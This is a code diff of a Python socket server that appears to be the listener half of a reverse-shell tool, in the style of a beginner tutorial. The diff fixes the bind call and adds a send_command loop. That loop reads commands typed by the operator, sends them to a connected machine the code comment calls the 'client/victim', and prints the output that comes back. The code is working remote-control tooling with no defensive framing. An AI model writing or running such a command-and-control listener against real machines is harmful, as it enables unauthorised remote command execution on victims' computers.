@@ -28,8 +28,9 @@ def bind_socket():
 
 		print ("binding the Port: " + str(port))
 
-		s.bind(host,port)
-		s.listen(5) #number if connections it tolerates before throwing 
+		s.bind((host,port))
+		s.listen(5) #number if connections it tolerates before throwing
+		print("listening...") 
 
 	except socket.error as err:
 		print("socket binding error " + str(err) + "\n" + "Retrying...")
@@ -47,4 +48,35 @@ def socket_accept():
 	send_command(conn)
 
 	conn.close()
+
+
+#send commands to client/victim or a friend
+def send_command(conn):
+	while 1:
+		cmd = input()
+		if cmd == 'quit':
+			conn.close()
+			s.close()
+			sys.exit()
+
+		if len(str.encode(cmd)) > 0:
+			conn.send(str.encode(cmd))
+			client_response = str(conn.recv(1024),"utf-8")
+			print(client_response, end="")
+
+def main():
+	create_socket()
+	bind_socket()
+	socket_accept()
+
+
+
+main()
+
+
+
+
+
+
+
 
